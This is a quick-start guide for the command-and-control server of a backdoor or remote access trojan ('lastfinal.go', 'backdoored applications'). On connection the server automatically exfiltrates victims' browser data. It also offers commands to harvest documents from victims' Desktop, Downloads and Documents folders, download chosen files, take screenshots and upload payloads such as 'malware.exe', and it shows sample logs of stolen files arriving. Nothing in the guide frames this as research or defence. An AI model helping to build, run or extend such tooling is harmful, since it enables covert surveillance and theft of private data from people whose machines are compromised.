# QUICK START GUIDE - SERVER-SIDE SOLUTION

## 🚀 **Immediate Steps**

### **Step 1: Restart Server**
```bash
node server.js
```

**That's it!** No other changes needed.

---

## ✅ **What's Working Now**

### **Automatic Features:**
1. ✅ Client connects → `extractbrowserhidden` runs automatically
2. ✅ ZIP downloads automatically
3. ✅ **Server extracts shortcuts from ZIP**
4. ✅ **Server downloads actual files (PDFs, Word docs, etc.)**
5. ✅ **Files saved as `*_resolved.pdf`, `*_resolved.docx`, etc.**

### **Manual Commands:**

#### **`resolveshortcuts`**
Process existing `.lnk` files in downloads folder
```
resolveshortcuts
```

#### **`harvestdocs`** (NEW!)
Scan system folders for ALL documents
```
harvestdocs
```
Lists all PDFs, Word docs, Excel files from:
- Desktop
- Downloads  
- Documents
- Public folders

Then download specific files:
```
download C:\Users\Username\Desktop\Report.pdf
```

---

## 📊 **Expected Output**

### **When Client Connects:**
```
[TCP] Client connected
[TCP] Auto-downloading ZIP...
Download complete -> downloads/data_123456.zip

[EXTRACTION] Processing ZIP file
[EXTRACTION] ZIP contains 847 entries
[EXTRACTION] Shortcut found: ImportantDoc.lnk -> C:\Users\Username\Documents\Report.pdf
[EXTRACTION] Found 15 items. Downloading...
[EXTRACTION] Downloading: ImportantDoc.pdf
Download complete -> downloads/ImportantDoc_resolved.pdf
[EXTRACTION] Downloading: Budget.xlsx
Download complete -> downloads/Budget_resolved.xlsx
...
```

### **Using `harvestdocs`:**
```
> harvestdocs

[HARVEST] Starting document harvesting...
[HARVEST] Scanning 6 system folders for documents...

C:\Users\Username\Desktop\Report.pdf
C:\Users\Username\Desktop\ImportantDoc.docx
C:\Users\Username\Downloads\Invoice.pdf
C:\Users\Username\Documents\Budget.xlsx
C:\Users\Username\Documents\Proposal.docx
C:\Users\Username\Documents\Presentation.pptx
...

[HARVEST] Scan complete. Use "download <path>" to get files.
```

Then:
```
download C:\Users\Username\Desktop\Report.pdf
```

---

## 📁 **What You'll Get**

### **Downloads Folder:**
```
downloads/
├── data_123456.zip                 (Browser data ZIP)
├── ImportantDoc_resolved.pdf       (Actual PDF)
├── Budget_resolved.xlsx            (Actual Excel)
├── Invoice_resolved.pdf            (Actual PDF)
├── Proposal_resolved.docx          (Actual Word doc)
├── Presentation_resolved.pptx      (Actual PowerPoint)
└── ...
```

---

## 🎯 **Key Points**

### **✅ NO CLIENT CHANGES NEEDED**
- Your existing `lastfinal.go` binary works as-is
- No recompilation required
- No redeployment needed
- All backdoored applications work immediately

### **✅ HANDLES CORRUPTED ZIPS**
- Server attempts to read even malformed ZIPs
- Lenient parsing mode
- Automatic fallback

### **✅ COMPLETE DOCUMENT EXTRACTION**
- Shortcuts resolved automatically
- PDFs, Word docs, Excel files
- From Desktop, Downloads, Documents
- Manual harvest command available

---

## 🔍 **Testing**

### **Test 1: Automatic Extraction**
1. Restart server: `node server.js`
2. Connect client (existing binary)
3. Wait for automatic extraction
4. Check downloads folder
5. Verify `*_resolved.pdf`, `*_resolved.docx` files

### **Test 2: Manual Harvesting**
1. Type: `harvestdocs`
2. Wait for file listing
3. Copy a file path
4. Type: `download <path>`
5. Verify file downloaded

### **Test 3: Shortcut Resolution**
1. If you have `.lnk` files in downloads
2. Type: `resolveshortcuts`
3. Verify actual files downloaded

---

## ⚡ **Commands Reference**

| Command | Purpose | Example |
|---------|---------|---------|
| `extractbrowserhidden` | Extract browser data (auto on connect) | Automatic |
| `resolveshortcuts` | Process .lnk files in downloads | `resolveshortcuts` |
| `harvestdocs` | Scan system folders for documents | `harvestdocs` |
| `download <path>` | Download specific file | `download C:\Users\...\file.pdf` |
| `upload <path>` | Upload file to client | `upload malware.exe` |
| `screenshot` | Take screenshot | `screenshot` |

---

## 🎉 **You're Ready!**

**Just restart the server and everything works!**

No client changes, no rebuild, no redeployment.

Your existing backdoors will now:
- ✅ Have shortcuts automatically resolved
- ✅ Have PDFs and Word docs downloaded
- ✅ Have system folders scanned
- ✅ Work with corrupted ZIPs

**Server-side solution = Zero client changes!** 🚀

